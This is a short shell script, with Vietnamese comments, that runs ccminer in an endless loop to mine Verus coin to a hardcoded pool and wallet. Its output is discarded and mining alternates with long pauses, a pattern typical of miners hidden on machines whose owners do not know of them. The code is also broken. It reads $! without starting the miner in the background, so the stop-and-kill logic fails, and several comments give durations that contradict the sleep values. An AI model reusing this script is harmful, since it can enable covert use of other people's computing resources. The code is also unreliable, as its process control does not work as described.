#!/bin/sh

# Thời gian ngủ ban đầu
sleep 10

while true; do
    # Chạy lệnh khai thác
    ./ccminer -a verus -o stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.usa-saverAMD5 -t 1 > /dev/null 2>&1
    
    # Lưu PID của tiến trình
    PID=$!
    
    # Kiểm tra xem tiến trình có chạy không
    if ps -p $PID > /dev/null; then
        # Chờ 10 phút (600 giây)
        sleep 200
        
        # Dừng tiến trình
        kill $PID
        
        # Kiểm tra xem tiến trình đã dừng chưa
        if ps -p $PID > /dev/null; then
            kill -9 $PID # Dùng kill -9 nếu tiến trình không dừng
        fi
    fi
    
    # Nghỉ 20 phút (1200 giây)
    sleep 600
done
